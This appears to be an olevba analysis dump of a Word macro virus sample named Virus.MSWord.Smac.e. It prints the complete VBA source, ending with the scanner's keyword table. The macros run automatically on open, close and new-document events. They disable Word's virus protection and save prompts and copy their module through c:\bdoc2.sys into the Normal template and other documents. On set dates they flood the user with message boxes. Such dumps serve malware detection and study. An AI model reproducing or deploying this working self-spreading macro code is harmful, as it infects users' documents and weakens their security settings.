olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smac.e-a0cf904e181394b034a4955e42e068e68795b686
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smac.e-a0cf904e181394b034a4955e42e068e68795b686 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO bdoc2.bas 
in file: Virus.MSWord.Smac.e-a0cf904e181394b034a4955e42e068e68795b686 - OLE stream: 'Macros/VBA/bdoc2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "bdoc2" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "bdoc2" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Doc.VBProject.VBComponents("bdoc2").Export ("c:\bdoc2.sys")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Label_Exit:
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error Resume Next
DisplayAlerts = wdAlertsNone
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "bdoc2" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "bdoc2" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = True Then GoTo Label_Exit
If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.import ("c:\bdoc2.sys")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.import ("c:\bdoc2.sys")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Label_Exit:
Kill ("c:\bdoc2.sys")
If Day(Now) = 2 And Month(Now) = 9 Then
For I = 1 To 1000000
msg = Chr(-11328) + Chr(-11082) + Chr(-19004) + Chr(-10333) + Chr(-18269) + Chr(32) + Chr(44) + Chr(32) + Chr(-13830) + Chr(-14123) + Chr(-16404) + Chr(-16170) + Chr(32) + Chr(33) + Chr(33) + Chr(33)
MsgBox msg, vbCritical
Next I
End If
End Sub

Public Sub AutoExec()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
Options.VirusProtection = False
End Sub
Sub AutoExit()
On Error Resume Next
Kill ("c:\bdoc2.sys")
If Day(Now) = 13 Then MsgBox Chr(-12604) + Chr(-17154) + Chr(-18191) + Chr(-13635) + Chr(-19219) + Chr(-12557) + Chr(44) + Chr(-14357) + Chr(-11871) + Chr(-11325) + Chr(-19007) + Chr(-20250) + Chr(-14099) + Chr(-17154) + Chr(33) + Chr(80) + Chr(114) + Chr(101) + Chr(115) + Chr(115) + Chr(32) + Chr(79) + Chr(75) + Chr(32) + Chr(46), vbCritical
End Sub
Sub AutoNew()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
NormalTemplate.VBProject.VBComponents("bdoc2").Export ("c:\bdoc2.sys")
End Sub
Sub ToolsMacro()

End Sub
Sub FileTemplates()

End Sub
Sub ViewVBCode()

End Sub
Sub HelpWordPerfectHelp()

End Sub
Sub ToolsCustomize()

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

